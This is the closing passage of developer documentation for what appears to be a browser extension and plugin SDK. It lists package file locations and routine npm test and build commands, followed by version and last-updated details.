- `done(args?)` - Cleanup and exit

---

## Additional Resources

### Package Locations
- **Plugin SDK:** `packages/plugin-sdk/`
- **Extension:** `packages/extension/`
- **SessionManager:** `packages/extension/src/offscreen/SessionManager.ts`
- **ProveManager:** `packages/extension/src/offscreen/ProveManager/`
- **WindowManager:** `packages/extension/src/background/WindowManager.ts`
- **Host:** `packages/plugin-sdk/src/index.ts`

### Testing
- Run plugin-sdk tests: `cd packages/plugin-sdk && npm test`
- Run extension tests: `cd packages/extension && npm test`
- Serve test page: `npm run serve:test` (from root)

### Build Commands
- Build all packages: `npm run build:all`
- Build extension: `cd packages/extension && npm run build`
- Build plugin-sdk: `cd packages/plugin-sdk && npm run build`

---

**Last Updated:** October 2025
**Plugin SDK Version:** 0.1.0
**Extension Version:** 0.1.0
